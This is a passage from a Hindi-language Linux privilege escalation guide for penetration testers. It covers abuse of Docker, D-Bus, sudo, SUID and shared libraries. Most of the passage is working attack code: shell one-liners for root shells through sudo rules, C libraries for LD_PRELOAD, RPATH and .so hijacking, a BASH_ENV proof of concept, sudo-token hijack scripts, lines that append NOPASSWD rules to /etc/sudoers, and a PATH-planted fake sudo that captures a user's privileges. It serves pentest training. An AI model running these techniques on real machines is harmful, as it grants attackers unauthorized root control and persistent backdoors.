Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप `ctr` कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप `runc` कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है जो applications को कुशलतापूर्वक interact और data share करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह विभिन्न प्रकार की application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा आदान-प्रदान को बढ़ाता है, और यह **enhanced UNIX domain sockets** की तरह है। इसके अतिरिक्त, यह events या signals के ब्रॉडकास्ट में मदद करता है, जिससे सिस्टम कम्पोनेंट्स के बीच सहज एकीकरण होता है। उदाहरण के लिए, incoming call के बारे में Bluetooth daemon का एक signal एक music player को mute करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। साथ ही, D-Bus remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और उन प्रक्रियाओं को streamline करता है जो पारंपरिक रूप से जटिल थीं।

D-Bus एक **allow/deny model** पर काम करता है, जो message permissions (method calls, signal emissions, आदि) को matching policy rules के समुच्चय प्रभाव के आधार पर प्रबंधित करता है। ये policies bus के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन permissions के दुरुपयोग से संभवतः privilege escalation की अनुमति दे सकती हैं।

ऐसी एक policy का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user के लिए `fi.w1.wpa_supplicant1` के मालिक होने, इसे संदेश भेजने और संदेश प्राप्त करने की permissions का विवरण देता है।

Policies जिनमें किसी user या group का निर्दिष्ट उल्लेख नहीं है वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट policies के तहत नहीं आते।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ सीखें कि कैसे D-Bus communication को enumerate और exploit करना है:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

यह हमेशा दिलचस्प होता है network को enumerate करना और मशीन की स्थिति का पता लगाना।

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो मशीन पर चल रही हों और जिनसे आप उसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि क्या आप sniff traffic कर सकते हैं। अगर आप कर सकते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य एन्यूमरेशन

जाँचें कि आप **कौन** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो users with **UID > INT_MAX** को escalate privileges करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी ऐसे **समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड में कुछ रोचक मौजूद है या नहीं (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप पर्यावरण का कोई भी **password जानते हैं** तो उसी password का उपयोग करके **प्रत्येक user के रूप में लॉगिन** करने का प्रयास करें।

### Su Brute

यदि आपको ज्यादा शोर करने की परवाह नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके users को brute-force करने का प्रयास कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी users पर brute-force करने की कोशिश करता है।

## लिखने योग्य $PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं**, तो आप privileges escalate कर सकते हैं — writable फ़ोल्डर के अंदर किसी कमांड के नाम से एक backdoor बनाकर, जिसे किसी अन्य user (ideally root) द्वारा execute किया जाएगा और जो **आपके writable फ़ोल्डर से पहले** $PATH में स्थित किसी फ़ोल्डर से लोड नहीं होता।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ command execute करने की अनुमति दी गई हो सकती है या उन पर suid bit सेट हो सकता है। इसे जाँचने के लिए:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको files पढ़ने और/या लिखने या यहां तक कि किसी command को execute करने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के अधिकारों के साथ कुछ कमांड चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब root निर्देशिका में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना सरल है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी चीज़ को निष्पादित करते समय **environment variable सेट करने** की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **असुरक्षित** था **PYTHONPATH hijacking** के लिए ताकि स्क्रिप्ट को root के रूप में चलाते समय किसी मनमाना python library को load किया जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के जरिए संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदाहरण के लिए, `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup व्यवहार का उपयोग करके अनुमत कमांड को invoke करते समय arbitrary code को root के रूप में चला सकते हैं।

- क्यों यह काम करता है: non-interactive shells के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और target script को चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम किसी script या shell wrapper को चलाने की अनुमति देते हैं। यदि sudo द्वारा `BASH_ENV` संरक्षित है, तो आपकी फ़ाइल root privileges के साथ source होगी।

- आवश्यकताएँ:
- चलाने के लिए एक sudo नियम जो आपके द्वारा रन किया जा सके (कोई भी target जो non-interactively `/bin/bash` को invoke करे, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद होना चाहिए (जाँच के लिए `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- env_keep से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars उपयोग किए जाएँ तो sudo I/O logging और alerting पर विचार करें।

### Sudo निष्पादन को बायपास करने वाले paths

**Jump** अन्य फ़ाइलें पढ़ने के लिए या **symlinks** का उपयोग करने के लिए। For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग (\*) किया गया है, तो यह और भी आसान हो जाता है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path के

यदि किसी एक command को **sudo permission** दिया गया है और **path निर्दिष्ट नहीं किया गया है**: _hacker10 ALL= (root) less_ तो आप इसे PATH variable को बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है यदि एक **suid** बाइनरी **किसी अन्य कमांड को बिना पाथ बताए चलाती है (हमेशा जाँच के लिए** _**strings**_ **का उपयोग कर अजीब SUID बाइनरी की सामग्री)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID बाइनरी कमांड पाथ के साथ

यदि **suid** बाइनरी **किसी अन्य कमांड को पाथ निर्दिष्ट करके चलाती है**, तो आप उस कमांड के नाम से एक फ़ंक्शन बनाकर और उसे **export a function** करने की कोशिश कर सकते हैं जिसे suid फ़ाइल कॉल कर रही है।

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को loader द्वारा अन्य सभी लाइब्रेरियों से पहले लोड करने के लिए किया जाता है, जिनमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library का preloading कहा जाता है।

हालाँकि, सिस्टम की सुरक्षा बनाए रखने और इस फीचर के दुरुपयोग को रोकने के लिए, विशेषकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- Loader उन executables के लिए **LD_PRELOAD** को अनदेखा करता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल वे लाइब्रेरियाँ preload की जाती हैं जो standard paths में हैं और जो खुद भी suid/sgid हैं।

Privilege escalation तब हो सकती है जब आपके पास `sudo` के साथ commands execute करने की क्षमता हो और `sudo -l` के output में **env_keep+=LD_PRELOAD** का बयान शामिल हो। यह configuration **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ commands चलाने पर भी इसे मान्यता देने की अनुमति देता है, जिससे संभावित रूप से arbitrary code का execution elevated privileges के साथ हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह उस पथ को नियंत्रित करता है जहाँ लाइब्रेरीज़ खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी ऐसे बाइनरी का सामना हो जो असामान्य रूप से **SUID** permissions के साथ हो, तो यह अच्छी प्रैक्टिस है यह सत्यापित करना कि वह सही तरीके से **.so** फाइलें लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का सामना करना संभावित exploitation का संकेत देता है।

To exploit this, एक C फ़ाइल बनानी होगी, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compile और execute होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करने के माध्यम से privileges को बढ़ाने का लक्ष्य रखता है।

ऊपर दिए गए C file को एक shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस folder से library लोड कर रहा है जहाँ हम write कर सकते हैं, तो आइए उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको ऐसी त्रुटि मिलती है जैसे
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिन्हें attacker स्थानीय security restrictions को बायपास करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप कमांड में केवल arguments इंजेक्ट कर सकते हैं।

प्रोजेक्ट Unix binaries के वैध functions को इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, privileges escalate या उच्च privileges बनाए रखने, फ़ाइलें ट्रांसफर करने, bind और reverse shells spawn करने, और अन्य post-exploitation कार्यों को सरल बनाने के लिए abused किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग यह जाँचने के लिए कर सकते हैं कि यह किसी भी sudo नियम को exploit करने का तरीका ढूंढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है लेकिन password नहीं है, आप privileges escalate कर सकते हैं by **किसी sudo कमांड के execute होने का इंतज़ार करके और फिर session token को hijack करके**।

Privileges escalate करने की आवश्यकताएँ:

- आपके पास पहले से ही user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने हाल के **15mins** में कुछ execute करने के लिए **`sudo` का उपयोग किया हुआ होना चाहिए** (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो हमें बिना password डाले `sudo` उपयोग करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का आउटपुट 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे अपलोड कर पाने में सक्षम होने चाहिए)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी आवश्यकताएँ पूरी हैं, तो **आप निम्न का उपयोग करके privileges escalate कर सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- पहला **exploit** (`exploit.sh`) बाइनरी `activate_sudo_token` को _/tmp_ में बनाएगा। आप इसका उपयोग अपने session में **sudo token को activate करने** के लिए कर सकते हैं (आपको स्वतः ही root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा **root के स्वामित्व में और setuid के साथ**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को स्थायी बना देगा और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी user और PID के लिए **sudo token** बना सकते हैं।\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप पासवर्ड जाने बिना **obtain sudo privileges** कर सकते हैं, जैसे:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**.\
**If** आप इस फ़ाइल को **read** कर सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त कर सकते हैं**, और यदि आप किसी भी फ़ाइल में **write** कर सकते हैं तो आप **escalate privileges** कर पाएँगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `sudo` बाइनरी के कुछ विकल्प हैं, जैसे `doas` — इसके कॉन्फ़िगरेशन को `/etc/doas.conf` पर ज़रूर जांचें
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **उपयोगकर्ता सामान्यतः किसी मशीन से कनेक्ट होता है और privileges बढ़ाने के लिए `sudo` का उपयोग करता है** और आपने उस उपयोगकर्ता context में एक shell प्राप्त कर लिया है, तो आप **एक नया sudo executable बना सकते हैं** जो सबसे पहले आपका कोड root के रूप में चालायेगा और फिर उपयोगकर्ता का command चलायेगा। फिर, उपयोगकर्ता context का **$PATH** बदलें (उदा. नए path को .bash_profile में जोड़कर) ताकि जब उपयोगकर्ता `sudo` चलाये तो आपका sudo executable चलाया जाय।

ध्यान दें कि यदि उपयोगकर्ता कोई अलग shell (bash नहीं) उपयोग करता है तो आपको नए path को जोड़ने के लिए अन्य फाइलें संशोधित करनी पड़ सकती हैं। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है कि **where the loaded configurations files are from**। आम तौर पर, इस फ़ाइल में निम्न पंक्ति होती है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से configuration फ़ाइलें पढ़ी जाएँगी। ये configuration फ़ाइलें उन अन्य फ़ोल्डरों की ओर संकेत करती हैं जहाँ **libraries** खोजी जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर libraries की खोज करेगा**।

यदि किसी कारणवश किसी भी बताए गए पथ पर **a user has write permissions**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के अंदर कॉन्फ़िग फ़ाइल में बताए गए किसी भी फ़ोल्डर पर, तो वह उपयोगकर्ता संभवतः escalate privileges कर सकता है.\  
निम्न पृष्ठ में देखें कि **how to exploit this misconfiguration**:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर, इसे `RPATH` वैरिएबल में निर्दिष्ट इस स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक evil library बनाएं: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities किसी process को उपलब्ध root privileges का एक उपसमूह प्रदान करते हैं। यह प्रभावी रूप से root **privileges into smaller and distinctive units** में विभाजित कर देता है। इन यूनिट्स में से प्रत्येक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह पूरा privileges का सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
अधिक जानकारी और यह जानने के लिए कि capabilities का कैसे दुरुपयोग किया जा सकता है, निम्न पृष्ठ पढ़ें:

{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

डायरेक्टरी में, the **bit for "execute"** का अर्थ है कि प्रभावित user folder में "**cd**" कर सकता है।\
**"read"** bit का अर्थ है कि user फ़ाइलों की **list** कर सकता है, और **"write"** bit का अर्थ है कि user नई **files** **delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) पारंपरिक ugo/rwx permissions को **overriding** करने में सक्षम डिस्क्रेशनरी अनुमतियों की द्वितीयक परत का प्रतिनिधित्व करते हैं। ये permissions file या directory access पर नियंत्रण को बढ़ाते हैं, जिससे मालिक या समूह का हिस्सा न होने वाले विशिष्ट users को अधिकार देने या अस्वीकार करने की सुविधा मिलती है। यह स्तर अधिक सटीक access management सुनिश्चित करने की **granularity** प्रदान करता है। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" को किसी file पर read और write permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करणों** में आप किसी दूसरे user (**root**) के किसी **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल **अपने user** के screen sessions से ही **connect** कर पाएँगे। हालाँकि, आपको **session के अंदर रोचक जानकारी** मिल सकती है।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या पुराने **tmux versions** में थी। मैं non-privileged user के रूप में root द्वारा बनाई गई tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions सूची करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
उदाहरण के लिए **HTB के Valentine box** की जाँच करें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 variations संभव थे**। इसका अर्थ है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

